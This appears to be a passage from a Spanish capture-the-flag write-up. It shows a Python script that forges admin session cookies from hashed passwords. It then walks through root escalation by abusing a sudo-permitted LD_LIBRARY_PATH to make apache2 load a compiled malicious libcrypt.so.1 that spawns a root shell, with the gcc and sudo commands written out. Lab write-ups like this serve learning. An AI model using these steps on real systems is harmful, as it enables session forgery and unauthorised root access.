el PHPSSESID no es mas que user:password_hasheada <--- todo esto en base64

Ahora podemos generar diferente PHPSSESID con las password hasheadas que encontramos antes, para eso hacemos uso del siguiente script:

#!/usr/bin/python3

import hashlib


import base64



Open the file and read its lines


with open('hashes.txt', 'r') as f:


lines = f.readlines()



Loop through the lines and modify each one


for line in lines:

    # Strip the line of bad characters

stripped_line = ''.join(filter(str.isalnum, line))

    # Hash the stripped line using MD5

hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()

    # Add "admin:" to the beginning of the hash

modified_hash = 'admin:' + hashed_line

    # Encode the modified hash to base64

encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))

    # Print the encoded hash

print(encoded_hash.decode('ascii'))

PrivEsc a Root

Enumeramos privilegios Sudoers de rick

[imagen]

vemos que puede cambiar la variable de entorno LD_LIBRARY_PATH , lo cual es una vía de escalada de privilegios

LD_LIBRARY_PATH es una variable de entorno en sistemas Unix/Linux que especifica directorios donde el cargador dinámico de bibliotecas busca las bibliotecas compartidas (.so) antes de buscar en los directorios estándar del sistema.

tambien vemos que podemos ejecutar el binario de apache2 esta corriendo como root. Por lo tanto podemos aprovechar que podemos editar de donde se cargan las bibliotecas compartidas y hacer nuesta propia biblioteca maliciosa para apache2.

Listamos las bibliotecas compartidas que usa el binario apache2

comando: ldd /usr/sbin/apache2

[imagen]

Creando biblioteca maliciosa

Ahora vamos a crear un archivo binario que pretenda ser una biblioteca de estas con su mismo nombre, en mi caso usare : libcrypt.so.1

Primero creamos el archivo C para luego compilarlo y convertirlo en un binario

[imagen]

>[!nota] Este archivo lo que hace es hacer una llamada al sistema ejecutando una bash como root

ahora lo compilamos , comando: gcc -o /tmp/libcrypt.so.1 -shared -fPIC malicious.c

sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2 [imagen]
